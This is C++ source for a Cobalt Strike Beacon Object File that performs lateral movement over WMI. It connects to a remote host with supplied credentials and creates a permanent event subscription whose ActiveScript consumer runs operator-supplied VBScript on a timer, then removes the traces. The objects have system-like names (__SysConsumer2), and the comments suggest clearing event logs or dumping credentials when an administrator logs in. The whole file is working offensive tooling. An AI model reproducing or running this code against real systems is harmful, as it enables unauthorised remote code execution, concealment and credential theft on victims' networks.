//Adopted From: https://wumb0.in/scheduling-callbacks-with-wmi-in-cpp.html
//Good reader: https://flylib.com/books/en/2.568.1/handling_wmi_events.html
//Modified by Phil Keeble (@The_Keeb) to tie in aggressor and make it dynamic  

#include <objbase.h>
#include <windows.h>
#include <oleauto.h>
#include <wbemcli.h>
#include <combaseapi.h>


extern "C" {

#include "beacon.h"

    void go(char* buff, int len);

    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
    DECLSPEC_IMPORT	HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeEx(LPVOID, DWORD);
    DECLSPEC_IMPORT 	VOID     WINAPI		OLE32$CoUninitialize();
    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
    DECLSPEC_IMPORT 	HRESULT  WINAPI	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
    DECLSPEC_IMPORT 	VOID     WINAPI		OLEAUT32$VariantInit(VARIANTARG* pvarg);
    DECLSPEC_IMPORT 	WINBASEAPI void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
    DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* _Str);
    DECLSPEC_IMPORT     HRESULT  WINAPI         OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE* asAuthSvc, void* pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void* pAuthList, DWORD dwCapabilities, void* pReserved3);
    DECLSPEC_IMPORT 	BSTR 		 	OLEAUT32$SysAllocString(const OLECHAR*);
    WINBASEAPI          VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
}

BOOL putStringInClass(IWbemClassObject* obj, BSTR key, BSTR val, tag_CIMTYPE_ENUMERATION type) {
    VARIANT v;
    HRESULT hr;
    OLEAUT32$VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = val;
    hr = obj->Put(key, 0, &v, type);
    if (FAILED(hr))
        return FALSE;
    return TRUE;
}


void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity, wchar_t* user, wchar_t* password, wchar_t* domain, int IsCurrent) {

    COAUTHIDENTITY* id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
    {
        id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
        id->User = (USHORT*)user;
        id->Password = (USHORT*)password;
        id->Domain = (USHORT*)domain;
        id->UserLength = MSVCRT$wcslen((const wchar_t*)id->User);
        id->PasswordLength = MSVCRT$wcslen((const wchar_t*)id->Password);
        id->DomainLength = MSVCRT$wcslen((const wchar_t*)id->Domain);
        id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    }

    if (IsCurrent == 0)
    {
    id = NULL;
    }

    COAUTHINFO* inf = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));

    {
        inf->dwAuthnSvc = RPC_C_AUTHN_WINNT;
        inf->dwAuthzSvc = RPC_C_AUTHZ_NONE;
        inf->pwszServerPrincName = NULL;
        inf->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
        inf->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        inf->pAuthIdentityData = id;
        inf->dwCapabilities = EOAC_NONE;
    }
    *authidentity = id;
    *authInfo = inf;
}


void  go (char* buff, int len) {
    IWbemLocator* ploc = NULL;
    IWbemServices* psvc = NULL;
	
	//Payload
    //BSTR vbScript = OLEAUT32$SysAllocString(bwvbscript);

    IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
    IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;

    //Consumer string
    BSTR ActiveScriptConsumerFullNameString = OLEAUT32$SysAllocString(L"ActiveScriptEventConsumer.Name=\"__SysConsumer2\"");
    BSTR ActiveScriptConsumerString = OLEAUT32$SysAllocString(L"__SysConsumer2");

    //Filter string
    BSTR EventFilterFullNameString = OLEAUT32$SysAllocString(L"__EventFilter.Name=\"Filter1\"");
    BSTR EventFilterNameString = OLEAUT32$SysAllocString(L"Filter1");

    //FilterToConsumerBinding
    BSTR FilterToConsumerBindingPath = OLEAUT32$SysAllocString(L"__FilterToConsumerBinding.Consumer=\"ActiveScriptEventConsumer.Name=\\\"__SysConsumer2\\\"\",Filter=\"__EventFilter.Name=\\\"Filter1\\\"\"");

    //Script language 
    BSTR ActiveScriptLanguage = OLEAUT32$SysAllocString(L"VBScript");

    //TimerInterval
    BSTR TimerIntervalNameString = OLEAUT32$SysAllocString(L"__SysTimer1");
    BSTR TimerIntervalDurationString = OLEAUT32$SysAllocString(L"5000");
    BSTR TimerIntervalRelativePath = OLEAUT32$SysAllocString(L"__IntervalTimerInstruction.TimerId=\"__SysTimer1\"");

    //Query
    BSTR QueryString = OLEAUT32$SysAllocString(L"SELECT * FROM __timerevent where TimerId=\"__SysTimer1\"");


    wchar_t* Iwbmstr = OLEAUT32$SysAllocString(L"{dc12a687-737f-11cf-884d-00aa004b2e24}");
    wchar_t* Cwbmstr = OLEAUT32$SysAllocString(L"{4590f811-1d3a-11d0-891f-00aa004b2e24}");

    IID Iwbm;
    CLSID Cwbm;
    OLE32$CLSIDFromString(Cwbmstr, &Cwbm);
    OLE32$IIDFromString(Iwbmstr, &Iwbm);


    //Beacon flexibility [TBD!]
    {
        //The user specifies just the script/filter/etc name, aggressor changes it to  (full path + name), and here we just assign it
        BSTR bActiveScriptConsumerFullName;
        BSTR bEventFilterFullName;
        BSTR bQuery;
    }

    //init com interface
    HRESULT h = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED);
    if (FAILED(h)) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08x", h);
	return;
    }
    COAUTHIDENTITY* authidentity = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
    COAUTHINFO* authInfo = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
    
    //BEACON operations
    datap parser;
    wchar_t* bwusername;
    wchar_t* bwpassword;
    wchar_t* bwdomain;
    wchar_t* bwvbscript;
    wchar_t* bwtarget2;
    int IsCurrent;
	
    //BeaconDataParse(&parser, buf, len);
    BeaconDataParse(&parser, buff, len);
    {
	bwtarget2 =	(wchar_t*)BeaconDataExtract(&parser, NULL);
	bwdomain =	(wchar_t*)BeaconDataExtract(&parser, NULL);
        bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
        bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
        bwvbscript =	(wchar_t*)BeaconDataExtract(&parser, NULL);
        IsCurrent = BeaconDataInt(&parser);
    }
	
    CreateCreds(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent);

    if (IsCurrent == 0)
    {
    authidentity = NULL;
    }

    //CreateCreds(&authInfo, &authidentity);

    //Set Payload
    BSTR vbScript = OLEAUT32$SysAllocString(bwvbscript);
	
    //create COM instance for WBEM
    h = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (LPVOID*)&ploc);
    if (FAILED(h)) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08x", h);
	goto rip;
    }
	
    //connect to the \\root\subscription namespace
    //h = ploc->ConnectServer(OLEAUT32$SysAllocString(L"\\\\192.168.151.132\\ROOT\\SUBSCRIPTION"), OLEAUT32$SysAllocString(L"dcom"), OLEAUT32$SysAllocString(L"Password123!"), 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
    h = ploc->ConnectServer(OLEAUT32$SysAllocString(bwtarget2), NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
    if (FAILED(h)) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectServer failed: 0x%08x", h);
	goto rip;
    }
	
    //set COM proxy blanket
    h = OLE32$CoSetProxyBlanket(psvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(h)) {
        BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%08x", h);
	goto rip;
    }
	
    /* Delete the script
    Apparantly, the MSDN documentation isn't working. If I set the flag to WBEM_FLAG_RETURN_IMMEDIATELY in the second argument I get a wrong parameter error.
    There are two solutions, either pass 0 as the second parameter or pass IWbemCallResult* instance to the last one.
    Source: https://stackoverflow.com/questions/37189311/deleting-wmi-instance-with-c
    */
    h = psvc->DeleteInstance(ActiveScriptConsumerFullNameString, 0, NULL, NULL);
    h = psvc->DeleteInstance(EventFilterFullNameString, 0, NULL, NULL);
    h = psvc->DeleteInstance(FilterToConsumerBindingPath, 0, NULL, NULL);
    h = psvc->DeleteInstance(TimerIntervalRelativePath, 0, NULL, NULL);



    /* //Getting instance classes
    Since we want permenant event subscriptions, we need to create instances of three classes

    1. EventConsumer class
        We can choose between an ActiveScript or CommandLine. Here we use ActiveScript, I'll create another BOF for CommandLine

    2. EventFilter
        This is a must and there are no other options. There are multiple items of note
            CreatorSID: who created the event. If the creator is an administrator (which must be the case in lateral movement), then
            the CreatorSID represents the "Local Aministrators" group SID.

            EventAccess: From MSDN: "Use this property to specify that only events in the security context of specific accounts can be delivered to this filter. For example,
            a permanent event consumer may clear the security logs only when a specific event is generated by a specific user." This is nice, we can use it to clear all event logs
            only when an administrator logs in to the machine. Or, in environment where we can Dump creds safely, we can dump creds after an administrator logs in to the machine.

            Name: this must be unqiue. If it is not unique, the filter with same name will be over written (because I use WBEM_FLAG_CREATE_OR_UPDATE). If we use the
            WBEM_FLAG_CREATE_ONLY flag, the call will fail if a filter with the same name exists

            Query: the query that will trigger the notification. In this example, it is an interval timer query.


    3. FilterToConsumerBinding
        Up to now we have the consumer and the filter (i.e. notification), but they are not bound together. We must bind them together using this calss. The most two important arguments
        are the (obviously) consumer and filter.



    I have a fourth class in the example, which is the __IntervalTimerInstruction. This allows us to trigger on an interval. However, if an operator opts to use an intrinsic event, then there is no
    need to create a fourth instance. See an example here: https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/

    */
    {
        h = psvc->GetObject(OLEAUT32$SysAllocString(L"ActiveScriptEventConsumer"), 0, NULL, &eventConsumer, NULL);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "GetObject1 failed: 0x%08x", h);
		goto rip;
        }

        h = psvc->GetObject(OLEAUT32$SysAllocString(L"__EventFilter"), 0, NULL, &eventFilter, NULL);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "GetObject2 failed: 0x%08x", h);
		goto rip;
        }

        h = psvc->GetObject(OLEAUT32$SysAllocString(L"__FilterToConsumerBinding"), 0, NULL, &f2cBinding, NULL);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "GetObject3 failed: 0x%08x", h);
		goto rip;
        }

        h = psvc->GetObject(OLEAUT32$SysAllocString(L"__IntervalTimerInstruction"), 0, NULL, &timerinstruction, NULL);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "GetObject4 failed: 0x%08x", h);
		goto rip;
        }
    }


    /* Spawning instances

    */
    {
        //spawn __EventFilter class instance
        h = eventFilter->SpawnInstance(0, &ef);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance failed: 0x%08x", h);
		goto rip;
        }
        else {
            putStringInClass(ef, OLEAUT32$SysAllocString(L"Query"), QueryString, CIM_STRING);
            putStringInClass(ef, OLEAUT32$SysAllocString(L"QueryLanguage"), OLEAUT32$SysAllocString(L"WQL"), CIM_STRING); //Doesn't change
            putStringInClass(ef, OLEAUT32$SysAllocString(L"Name"), EventFilterNameString, CIM_STRING);
            h = psvc->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "PutInstance failed: 0x%08x", h);
		goto rip;
            }
        }

        //spawn ActiveScriptEventConsumer class instance
        h = eventConsumer->SpawnInstance(0, &ec);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance2 failed: 0x%08x", h);
		goto rip;
        }

        else {
            putStringInClass(ec, OLEAUT32$SysAllocString(L"Name"), ActiveScriptConsumerString, CIM_STRING);
            putStringInClass(ec, OLEAUT32$SysAllocString(L"ScriptingEngine"), ActiveScriptLanguage, CIM_STRING);
            putStringInClass(ec, OLEAUT32$SysAllocString(L"ScriptText"), vbScript, CIM_STRING);
            putStringInClass(ec, OLEAUT32$SysAllocString(L"KillTimeout"), OLEAUT32$SysAllocString(L"0"), CIM_STRING);
            h = psvc->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "PutInstance2 failed: 0x%08x", h);
		goto rip;
            }
        }
        //spawn __FilterToConsumerBinding class instance
        h = f2cBinding->SpawnInstance(0, &e2c);
        if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance3 failed: 0x%08x", h);
		goto rip;
        }
        else {

            putStringInClass(e2c, OLEAUT32$SysAllocString(L"Consumer"), ActiveScriptConsumerFullNameString, CIM_REFERENCE);
            putStringInClass(e2c, OLEAUT32$SysAllocString(L"Filter"), EventFilterFullNameString, CIM_REFERENCE);
            h = psvc->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
            if (FAILED(h)) {
        	BeaconPrintf(CALLBACK_ERROR, "PutInstance3 failed: 0x%08x", h);
		goto rip;
            }
        }

    }

    //spawn __IntervalTimerInstruction class instance
    h = timerinstruction->SpawnInstance(0, &ti);
    if (FAILED(h)) {
        BeaconPrintf(CALLBACK_ERROR, "SpawnInstance4 failed: 0x%08x", h);
	goto rip;
    }
    else {
        putStringInClass(ti, OLEAUT32$SysAllocString(L"TimerId"), TimerIntervalNameString, CIM_STRING);
        putStringInClass(ti, OLEAUT32$SysAllocString(L"IntervalBetweenEvents"), TimerIntervalDurationString, CIM_UINT32);

        h = psvc->PutInstance(ti, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        if (FAILED(h)) {
            BeaconPrintf(CALLBACK_ERROR, "PutInstance4 failed: 0x%08x", h);
	    goto rip;
        }
    }


    BeaconPrintf(CALLBACK_OUTPUT, "BOF Complete, now sleeping to allow execution");
    //Make sure that the event triggers before we delete it
    KERNEL32$Sleep(11000);

    BeaconPrintf(CALLBACK_OUTPUT, "Sleep complete");
    //Delete the script, we don't care that much if it fails because the event is not found
    h = psvc->DeleteInstance(ActiveScriptConsumerFullNameString, 0, NULL, NULL);
    h = psvc->DeleteInstance(EventFilterFullNameString, 0, NULL, NULL);
    h = psvc->DeleteInstance(FilterToConsumerBindingPath, 0, NULL, NULL);
    h = psvc->DeleteInstance(TimerIntervalRelativePath, 0, NULL, NULL);


    if (ti)
        ti->Release();
    if (e2c)
        e2c->Release();
    if (ef)
        ef->Release();
    if (ec)
        ec->Release();
    ti = ec = ef = e2c = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "Clean Up Completed");
rip:
    if (eventConsumer)
        eventConsumer->Release();
    if (eventFilter)
        eventFilter->Release();
    if (f2cBinding)
        f2cBinding->Release();
    if (timerinstruction)
        timerinstruction->Release();
    if (psvc)
        psvc->Release();
    if (ploc)
        ploc->Release();
    BeaconPrintf(CALLBACK_OUTPUT, "rip function called and completed");
    return;
}
